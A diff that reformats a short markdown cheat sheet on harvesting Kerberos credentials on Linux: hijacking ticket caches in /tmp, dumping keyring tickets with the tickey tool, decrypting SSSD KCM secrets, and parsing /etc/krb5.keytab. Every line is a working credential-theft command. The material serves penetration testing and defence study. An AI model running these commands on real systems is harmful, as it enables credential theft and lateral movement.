@@ -6,9 +6,9 @@
 
 ## From /tmp
 
- - ls /tmp/ | grep krb5cc
+    ls /tmp/ | grep krb5cc
 
- - export KRB5CCNAME=/tmp/krb5cc_1569901115
+    export KRB5CCNAME=/tmp/krb5cc_1569901115
 
 ## From keyring
 
@@ -16,13 +16,13 @@
 
 #### 1) Configuration and build
 
- - git clone https://github.com/TarlogicSecurity/tickey
+    git clone https://github.com/TarlogicSecurity/tickey
 
- - cd tickey/tickey
+    cd tickey/tickey
 
- - make CONF=Release
+    make CONF=Release
 
- - /tmp/tickey -i
+    /tmp/tickey -i
 
 ## From SSSD KCM
 
@@ -30,16 +30,16 @@
 
 ### Invoking SSSDKCMExtractor with the --database and --key parameters will parse the database and decrypt the secrets.
 
- - git clone https://github.com/mandiant/SSSDKCMExtractor
+    git clone https://github.com/mandiant/SSSDKCMExtractor
 
- - python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
+    python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
 
 ### The credential cache Kerberos blob can be converted into a usable Kerberos CCache file that can be passed to Mimikatz/Rubeus.
 
 ## From keytab
 
- - git clone https://github.com/its-a-feature/KeytabParser
+    git clone https://github.com/its-a-feature/KeytabParser
 
- - python KeytabParser.py /etc/krb5.keytab
+    python KeytabParser.py /etc/krb5.keytab
 
- - klist -k /etc/krb5.keytab
+    klist -k /etc/krb5.keytab
